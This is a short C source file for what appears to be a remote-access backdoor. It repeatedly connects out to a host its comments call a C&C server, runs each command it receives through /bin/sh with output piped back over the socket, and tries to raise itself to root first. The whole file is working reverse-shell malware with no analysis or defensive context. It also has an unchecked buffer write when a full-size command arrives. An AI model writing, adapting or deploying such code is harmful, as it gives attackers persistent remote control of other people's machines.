#include "conn.h"
#include "util.h"
#include <unistd.h>
#include <sys/wait.h>

static void run_command(int fd, char *cmd) {
        pid_t pid = fork();

        if(pid == 0) {
                // Try to run as root if possible
                setuid(0);
                setgid(0);

                dup2(fd, STDOUT_FILENO);
                dup2(fd, STDERR_FILENO);

                execlp("/bin/sh", "/bin/sh", "-c", cmd, NULL);
        }
        else {
                waitpid(pid, NULL, 0);
        }
}

static void handle_connection(int fd) {
        static char cmd[CMD_SIZE];

        while(1) {

                int r;
                if((r = read(fd, cmd, CMD_SIZE)) > 0) {
                        cmd[r] = 0;
                        run_command(fd, cmd);
                }
                else {
                        close(fd);
                        return;
                }

        }
}

int main(int argc, char **argv) {
        const char *host = argc > 1 ? argv[1] : "127.0.0.1";
        const char *port = argc > 2 ? argv[2] : "7777";

        while(1) {
                // Try to connect to C&C server
                int conn = get_connection(host, port);
                if(conn > 0) {
                        handle_connection(conn);
                }
                else {
                        sleep(5);
                }
        }

}
